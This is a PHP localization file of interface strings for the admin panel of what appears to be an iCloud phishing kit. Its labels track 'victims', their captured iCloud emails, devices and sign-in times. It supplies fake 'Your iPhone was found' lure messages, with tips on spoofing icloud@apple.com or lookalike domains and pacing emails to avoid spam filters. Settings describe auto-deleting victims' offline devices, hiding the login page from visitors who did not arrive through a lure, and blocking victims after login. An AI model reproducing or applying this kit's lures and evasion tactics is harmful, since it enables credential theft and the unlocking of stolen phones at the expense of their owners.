<?php

require_once 'loginpage.php';

//- Admin Panel
//-- Constant
$lang[ 'Vaild_message' ] = "Vaild";
$lang[ 'yes_message' ] = "Yes";
$lang[ 'no_message' ] = "No";
$lang[ 'off_message' ] = "Off";
$lang[ 'safeon_message' ] = "Script will not work normaly with this one On !";
$lang[ 'online_message' ] = "Online";
$lang[ 'new_message' ] = "New";
$lang[ 'Action_message' ] = "Action";
$lang[ 'since_message' ] = "Since";
$lang[ 'exp_message' ] = "Email";


//-- Admin Head
$lang[ 'Membersince_message' ] = "Member since";
$lang[ 'Profile_message' ] = "Profile";
$lang[ 'MAINNAVIGATION_message' ] = "MAIN NAVIGATION";
//-- Admin Menu
$lang[ 'DashBoard_message' ] = "DashBoard";
$lang[ 'Victims_message' ] = "Victims";
$lang[ 'ViewAll_message' ] = "View All";
$lang[ 'ViewAllAdmins_message' ] = "View All Admins";
$lang[ 'Email_message' ] = "Email";
$lang[ 'SendEmail_message' ] = "Send Email";
$lang[ 'Admins_message' ] = "Admins";
$lang[ 'AddAdmin_message' ] = "Add Admin";
$lang[ 'Setting_message' ] = "Setting";
$lang[ 'SiteOption_message' ] = "Site Option";

//-- Dashboard
$lang[ 'Howmanyvictim_message' ] = "How Many Victim's";
$lang[ 'Victim_message' ] = "Victim's";
$lang[ 'HowManyeMailSent_message' ] = "How Many eMail Sent";
$lang[ 'eMail_message' ] = "eMail's";
$lang[ 'HowManyIOS_message' ] = "How Many IOS";
$lang[ 'HOWMANYDEVICE_message' ] = "HOW MANY DEVICE'S";
$lang[ 'Device_message' ] = "Device's";
$lang[ 'HowManyOSX_message' ] = "How Many OSX";
$lang[ 'SimpleButPowerful_message' ] = "Simple But Powerful";
$lang[ 'Important_message' ] = "Important";
$lang[ 'LicenseStatus_message' ] = "License Status";
$lang[ 'LicenseCode_message' ] = "License Code";
$lang[ 'VersionStatus_message' ] = "Version Status";
$lang[ 'CurlEnabled_message' ] = "Curl Enabled";
$lang[ 'PHPVersion_message' ] = "PHP Version";
$lang[ 'SafeMode_message' ] = "Safe Mode";
//-- Victims Page
$lang[ 'Fulllistofvictims_message' ] = "Full list of victims signed up to the system.";
$lang[ 'ListDevice_message' ] = "List Of all Device's";
$lang[ 'havenodevice_message' ] = "This account dosn't have any device !";
$lang[ 'Devices_message' ] = "Devices";
$lang[ 'Platform_message' ] = "Platform";
$lang[ 'Ago_message' ] = "Ago";
$lang[ 'Newvictim_message' ] = "New victim";
$lang[ 'ViewMoreDetails_message' ] = "View More Details";
$lang[ 'Deletethisvictim_message' ] = "Delete this victim";
$lang[ 'LogintoiCloud_message' ] = "Login to iCloud";
$lang[ 'iCloudEmail_message' ] = "iCloud Email";
$lang[ 'UserBrowser_message' ] = "User Browser";
$lang[ 'UserPlatform_message' ] = "User Platform";
$lang[ 'SigninTime_message' ] = "Signin Time";
$lang[ 'UserAgentInfo_message' ] = "User Agent Info's";
//-- Mail Page
$lang[ 'Messagesentsucce_message' ] = "Message has been sent successfully, to review it please visit sent box here";
$lang[ 'From_message' ] = "From";
$lang[ 'Compose_message' ] = "Compose";
$lang[ 'Folders_message' ] = "Folders";
$lang[ 'Inbox_message' ] = "Inbox";
$lang[ 'Sent_message' ] = "Sent";
$lang[ 'Trash_message' ] = "Trash";
$lang[ 'ReadMail_message' ] = "Read Mail";
$lang[ 'Subject_message' ] = "Subject";
$lang[ 'wefounddevice_message' ] = "We've found your device!";
$lang[ 'BacktoInbox_message' ] = "Back to Inbox";
$lang[ 'Basicmode_message' ] = "Basic mode";
$lang[ 'AdvanceSetting_message' ] = "Advance Setting";
$lang[ 'Emailto_message' ] = "Email to";
$lang[ 'Name_message' ] = "Name";
$lang[ 'Emailowner_message' ] = "Email of the device owner";
$lang[ 'Phonename_message' ] = "Phone name or the person name.";
$lang[ 'DeviceType_message' ] = "Device Type";
$lang[ 'Devicetype_message' ] = "Device type ex. iPhone,iPad,iPod,iMac,MackBookPro etc.";
$lang[ 'Time_message' ] = "Time";
$lang[ 'Timedevice_message' ] = "Time device found ex. 7:00 AM don't forget the AM or PM";
$lang[ 'NearAdrress_message' ] = "Near Adrress";
$lang[ 'Adrressdevice_message' ] = "Adrress device has found ex. Wall Str. No 6 New York United State";
$lang[ 'ComposeNew_Message' ] = "Advance mode";
$lang[ 'PleaseClicklocation_message' ] = "Please Click on the nearest location for the owner on the bottom map and it will auto generate the number's for you.";
$lang[ 'GenerateMail_message' ] = "Generate Mail Template";
$lang[ 'ComposeNewMessage_message' ] = "Compose New Message";
$lang[ 'To_message' ] = "To";
$lang[ 'Reply_message' ] = "Reply";
$lang[ 'Forward_message' ] = "Forward";
$lang[ 'Deletes_message' ] = "Delete";
$lang[ 'messagelooks_message' ] = "Don't worry about how the message looks it will get the right look into his email client.";
$lang[ 'YouriPhonewasfound_message' ] = "Your iPhone was found nearby at 7:44 AM.";
$lang[ 'iPhonelastreported_message' ] = "Your iPhone’s last reported location will be available for 24 hours.";
$lang[ 'ViewLocation_message' ] = "View Location";
$lang[ 'Info_message' ] = "Info";
$lang[ 'Send_message' ] = "Send";
$lang[ 'Discard_message' ] = "Discard";
$lang[ 'FreeTips_message' ] = "Free Tips";
$lang[ 'tips1_message' ] = "Please send 10 emails peer hour, more than that you will be in risk of reporting as a spam.";
$lang[ 'tips2_message' ] = "You can use a custome email like icloud@apple.com or anything else with chance of 40% to deleviry to inbox, but we prefer to use your own domain with something near to icloud or ifind my iphone to be safe.";
$lang[ 'tips3_message' ] = "You have limited 1000 emials peer month, if u need more than that you have to go for the paid plan's with 5000 ~ 20000 emails peer month ask for the plan's price.";
//-- Admin Page
$lang[ 'fulladminlist_message' ] = "Full list of admins signed up to the system.";
$lang[ 'Addanewadmin_message' ] = "Add a new admin";
$lang[ 'Typetheusername_message' ] = "Type the username here";
$lang[ 'TypethePassword_message' ] = "Type the Password here";
$lang[ 'RepeatthePassword_message' ] = "Repeat the Password here";
$lang[ 'Typetheemailaddress_message' ] = "Type the email address here";
$lang[ 'FullName_message' ] = "Full Name";
$lang[ 'Typethefullname_message' ] = "Type the full name here";
$lang[ 'EditAdmin_message' ] = "Edit Admin";
$lang[ 'UpdateAdminEmail_message' ] = "Update Admin Email";
$lang[ 'ReEmail_message' ] = "Re-Email";
$lang[ 'UpdateMail_message' ] = "Update Mail";
$lang[ 'ChangeAdminPassword_message' ] = "Change Admin Password";
$lang[ 'OldPassword_message' ] = "Old Password";
$lang[ 'Typetheold_message' ] = "Type the old one here if not right nothing gonna change!";
$lang[ 'NewPassword_message' ] = "New Password";
$lang[ 'ChangePassword_message' ] = "Change Password";
$lang[ 'NotAuthority_message' ] = "Not Authority";
$lang[ 'Deleteadmin_message' ] = "Delete this admin";
$lang[ 'AdminSince_message' ] = "Admin Since";

//-- Setting page
$lang[ 'SiteSetting_message' ] = "Site Setting";
$lang[ 'SiteName_message' ] = "Site Name";
$lang[ 'Emailaddress_message' ] = "Email address";
$lang[ 'Received_message' ] = "Received";
$lang[ 'Sender_message' ] = "Sender";
$lang[ 'Inserttheemail_message' ] = "Insert the email that you will received the notifaction alert when victims logged in.";
$lang[ 'Insertemailsender_message' ] = "Insert the email sender to victims exp. icloud@domainname.com.";
$lang[ 'GeneralSetting_message' ] = "General Setting";
$lang[ 'SelectaLanguage_message' ] = "Select a Language";
$lang[ 'SelectaTemplate_message' ] = "Select a Template";
$lang[ 'Template_message' ] = "This tamplate will shows for the victims";
$lang[ 'Donotchange_message' ] = "Do not change this please leave it.";
$lang[ 'CloseSite_message' ] = "Close Site !";
$lang[ 'Closing_message' ] = "Closing Site for any new visit !";
$lang[ 'Closingbody_message' ] = "Closing Message";
$lang[ 'Closingbodyinfo_message' ] = "What u want to say for the visitors.";
$lang[ 'NotifactionSite_message' ] = "Notifaction";
$lang[ 'Notifaction_message' ] = "Sent Notifaction when new victim sign up !";
$lang[ 'DeleteDevice_message' ] = "Delete Device's";
$lang[ 'Delete_message' ] = "When vicitm's signin want to delete offline device's";
$lang[ 'SaveChange_message' ] = "Save Change";
$lang[ 'Silent_message' ] = "Silent";
$lang[ 'Open_message' ] = "Open";
$lang[ 'Close_message' ] = "Close";
$lang[ 'general_message' ] = "General";
$lang[ 'email_sender_message' ] = "Email Sender";
$lang[ 'email_verify_message' ] = "Email Verify";
$lang[ 'backup_message' ] = "Backup";
$lang[ 'login_path_message' ] = "Login Path";
$lang[ 'login_path_m_message' ] = "If you do not want victims to login into this url end exp. http://domain.com/login Please change login to any thing else like \"Signin, Auth etc\", just one word without space.";
$lang[ 'iforgot_path_message' ] = "iForgot Path";
$lang[ 'iforgot_path_m_message' ] = "If you do not want victims to login into this url end exp. http://domain.com/iforgot Please change login to any thing else like \"Signin, Auth etc\", just one word without space.";
$lang[ 'auto_delete_message' ] = "Auto Delete";
$lang[ 'auto_delete_m_message' ] = "While Victims Signin, It will auto delete all the offline device, If there any undeleted device you will recvied an email with it.";
$lang[ 'smart_detect_message' ] = "Smart detect";
$lang[ 'smart_detect_m_message' ] = "If On the system won't show the login page if is not redirect from email or sms if Off login page is open for every one visit your site.";
$lang[ 'mobile_detect_message' ] = "Mobile detect";
$lang[ 'mobile_detect_m_message' ] = "If On your victim visiting from mobile it will redirect automaticlly to FindMyiPhone template.";
$lang[ 'auto_block_message' ] = "Auto Block";
$lang[ 'auto_block_m_message' ] = "Auto Block Victims after they logged in they will see only coming soon page";
$lang[ 'auto_redirect_message' ] = "Auto Redirect";
$lang[ 'auto_redirect_m_message' ] = "Auto Redirect Victims after they logged in they will go to any link you insert blow.";
// titles
$lang[ 'UpdateEmail_message' ] = "Update Email";
$lang[ 'Dashdoard_message' ] = "Dashdoard";
$lang[ 'SendNewMessage_message' ] = "Send New Message";
$lang[ 'MessageSent_message' ] = "Message Sent";
$lang[ 'DeletedMessage_message' ] = "Deleted Message";
$lang[ 'SiteOptions_message' ] = "Site Options";
$lang[ 'Detailsabout_message' ] = "Details about #";
$lang[ 'ComingSoon_message' ] = "Coming Soon";

